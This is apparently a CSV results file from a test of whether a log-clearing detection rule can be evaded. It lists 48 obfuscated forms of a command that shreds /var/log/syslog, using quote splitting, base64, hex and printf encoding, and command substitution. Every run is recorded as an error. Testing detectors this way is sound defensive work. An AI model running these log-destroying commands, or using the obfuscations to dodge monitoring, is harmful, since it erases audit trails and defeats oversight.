ID,Command,Log File,Result,All Detected Rules
1,"shred -u /var/""log""/syslog",Clear_Linux_Logs_checklog_attack1.log,Log Error (Missing Result),
2,"shred -u /""var""/log/syslog",Clear_Linux_Logs_checklog_attack2.log,Log Error (Missing Result),
3,"shred -u ""/var""/log/syslog",Clear_Linux_Logs_checklog_attack3.log,Log Error (Missing Result),
4,"shred -u /var/log/""syslog""",Clear_Linux_Logs_checklog_attack4.log,Log Error (Missing Result),
5,"shred -u /var/log/sys""log""",Clear_Linux_Logs_checklog_attack5.log,Log Error (Missing Result),
6,"shred -u /va""r""/log/syslog",Clear_Linux_Logs_checklog_attack6.log,Log Error (Missing Result),
7,"shred -u /var/lo""g""/syslog",Clear_Linux_Logs_checklog_attack7.log,Log Error (Missing Result),
8,"sh""red"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack8.log,Log Error (Missing Result),
9,"""shred"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack9.log,Log Error (Missing Result),
10,"shre""d"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack10.log,Log Error (Missing Result),
11,"shred -u /var/log/sy""sl""og",Clear_Linux_Logs_checklog_attack11.log,Log Error (Missing Result),
12,"shred -u /var/l""og""/syslog",Clear_Linux_Logs_checklog_attack12.log,Log Error (Missing Result),
13,"shred -u /v""ar""/log/syslog",Clear_Linux_Logs_checklog_attack13.log,Log Error (Missing Result),
14,"sh""re""""d"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack14.log,Log Error (Missing Result),
15,"s""hr""ed -u /var/log/syslog",Clear_Linux_Logs_checklog_attack15.log,Log Error (Missing Result),
16,"shre""d"" -u ""/var/log/syslog""",Clear_Linux_Logs_checklog_attack16.log,Log Error (Missing Result),
17,shred -u /var/log/syslog\,Clear_Linux_Logs_checklog_attack17.log,Log Error (Missing Result),
18,"shred -u ""/var""/""log""/""syslog""",Clear_Linux_Logs_checklog_attack18.log,Log Error (Missing Result),
19,"sh""""red -u /var/log/syslog",Clear_Linux_Logs_checklog_attack19.log,Log Error (Missing Result),
20,"shred -u /var/lo""""g/syslog",Clear_Linux_Logs_checklog_attack20.log,Log Error (Missing Result),
21,"shred -u /va""""r/log/syslog",Clear_Linux_Logs_checklog_attack21.log,Log Error (Missing Result),
22,"shred -u /var/log/sy""""slog",Clear_Linux_Logs_checklog_attack22.log,Log Error (Missing Result),
23,"shred -u ""/var""/""log""/""syslog""",Clear_Linux_Logs_checklog_attack23.log,Log Error (Missing Result),
24,"""sh""""red"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack24.log,Log Error (Missing Result),
25,"s""hr""""ed"" -u /var/log/syslog",Clear_Linux_Logs_checklog_attack25.log,Log Error (Missing Result),
26,"shred -u /""var""/""log""/sys""log""",Clear_Linux_Logs_checklog_attack26.log,Log Error (Missing Result),
27,"shred -u ""/var""/log/""syslog""",Clear_Linux_Logs_checklog_attack27.log,Log Error (Missing Result),
28,shred -u $(echo '/var/log/syslog'),Clear_Linux_Logs_checklog_attack28.log,Log Error (Missing Result),
29,shred -u $(echo -n '/var/log/syslog'),Clear_Linux_Logs_checklog_attack29.log,Log Error (Missing Result),
30,shred -u $(echo '/var'/'log'/'syslog'),Clear_Linux_Logs_checklog_attack30.log,Log Error (Missing Result),
31,shred -u $(eval echo /var/log/syslog),Clear_Linux_Logs_checklog_attack31.log,Log Error (Missing Result),
32,"shred -u ""$(printf '/%s/%s/%s' var log syslog)""",Clear_Linux_Logs_checklog_attack32.log,Log Error (Missing Result),
33,shred -u $(echo /var/log/$(basename /var/log/syslog)),Clear_Linux_Logs_checklog_attack33.log,Log Error (Missing Result),
34,shred -u $(readlink -f /var/../var/log/syslog),Clear_Linux_Logs_checklog_attack34.log,Log Error (Missing Result),
35,"shred -u $(python3 -c ""print('/var/log/' + 'syslog')"")",Clear_Linux_Logs_checklog_attack35.log,Log Error (Missing Result),
36,"shred -u $(perl -e ""print '/var/log/syslog'"")",Clear_Linux_Logs_checklog_attack36.log,Log Error (Missing Result),
37,shred -u $(echo c3hyZWQgLXUgL3Zhci9sb2cvc3lzbG9n | base64 -d | cut -d ' ' -f3),Clear_Linux_Logs_checklog_attack37.log,Log Error (Missing Result),
38,shred -u $(printf '\057\166\141\162\057\154\157\147\057\163\171\163\154\157\147'),Clear_Linux_Logs_checklog_attack38.log,Log Error (Missing Result),
39,"shred -u $(awk 'BEGIN{printf ""/var/log/syslog""}')",Clear_Linux_Logs_checklog_attack39.log,Log Error (Missing Result),
40,"shred -u $(perl -e 'print ""/var/log/syslog""')",Clear_Linux_Logs_checklog_attack40.log,Log Error (Missing Result),
41,shred -u $(printf '/%s/%s/%s' var log syslog),Clear_Linux_Logs_checklog_attack41.log,Log Error (Missing Result),
42,shred -u $(echo 2f7661722f6c6f672f7379736c6f67 | xxd -r -p),Clear_Linux_Logs_checklog_attack42.log,Log Error (Missing Result),
43,shred -u $(echo L3Zhci9sb2cvc3lzbG9n | base64 -d),Clear_Linux_Logs_checklog_attack43.log,Log Error (Missing Result),
44,shred -u $(echo $((0x2f766172)) | sed 's/.*/\/var\/log\/syslog/'),Clear_Linux_Logs_checklog_attack44.log,Log Error (Missing Result),
45,shred -u $(printf '/var/%s/%s' log syslog),Clear_Linux_Logs_checklog_attack45.log,Log Error (Missing Result),
46,shred -u $(echo /var/log/syslog | iconv -f utf-8 -t utf-8),Clear_Linux_Logs_checklog_attack46.log,Log Error (Missing Result),
47,"shred -u $(printf '%s' ""$(echo /var/log/syslog)"")",Clear_Linux_Logs_checklog_attack47.log,Log Error (Missing Result),
48,shred -u $(echo /var/log/syslog | awk '{print}'),Clear_Linux_Logs_checklog_attack48.log,Log Error (Missing Result),
,,,,
,,,,
=== SUMMARY REPORT ===,,,,
Total Commands,48,,,
Total Triggered Target,0,,,
Total Bypass Target,0 (0.0%),,,
  > Bypass All (Silent),0,,,
  > Bypass Target Rule (Noisy),0,,,
Errors,48,,,
